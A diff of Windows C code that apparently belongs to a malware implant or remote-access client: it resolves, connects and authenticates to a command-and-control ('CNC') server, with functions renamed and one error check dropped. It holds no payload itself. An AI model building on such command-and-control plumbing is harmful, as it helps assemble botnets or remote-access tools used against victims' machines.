@@ -34,9 +34,7 @@ void get_cnc_addrinfo(struct addrinfo **result)
         fatal_error("getaddrinfo failed: %d", ret);
 
     cnc_addrinfo = *result;
-    ret = WSAAddressToStringA(cnc_addrinfo->ai_addr, cnc_addrinfo->ai_addrlen, NULL, cnc_addr, &cnc_addr_len);
-    if (ret != 0)
-        fatal_error("WSAAddressToStringA failed: %d", ret);
+    WSAAddressToStringA(cnc_addrinfo->ai_addr, cnc_addrinfo->ai_addrlen, NULL, cnc_addr, &cnc_addr_len);
     log_debug("CNC's address: %s", cnc_addr);
 }
 
@@ -48,7 +46,7 @@ void init_cnc_sock()
         fatal_error("Error at socket(): %ld", WSAGetLastError());
 }
 
-void auth_with_cnc()
+void auth_cnc()
 {
     int byte_count = 0;
     char received_auth_key[AUTH_KEY_LEN];
@@ -63,7 +61,7 @@ void auth_with_cnc()
         fatal_error("Received invalid authentication key from CNC.");
 }
 
-void connect_to_cnc(struct addrinfo *cnc_addrinfo)
+void connect_cnc(struct addrinfo *cnc_addrinfo)
 {
     int ret = 0;
 
@@ -83,7 +81,7 @@ void connect_to_cnc(struct addrinfo *cnc_addrinfo)
         }
         else
         {
-            auth_with_cnc();
+            auth_cnc();
             log_info("Connected to CNC.");
             return;
         }
@@ -96,7 +94,7 @@ void reconnect_cnc()
 
     get_cnc_addrinfo(&cnc_addrinfo);
     init_cnc_sock();
-    connect_to_cnc(cnc_addrinfo);
+    connect_cnc(cnc_addrinfo);
 }
 
 int send_cnc(void *buf, size_t len)
@@ -137,5 +135,5 @@ void init_cnc_conn(char *host)
     init_winsock();
     get_cnc_addrinfo(&cnc_addrinfo);
     init_cnc_sock();
-    connect_to_cnc(cnc_addrinfo);
+    connect_cnc(cnc_addrinfo);
 }
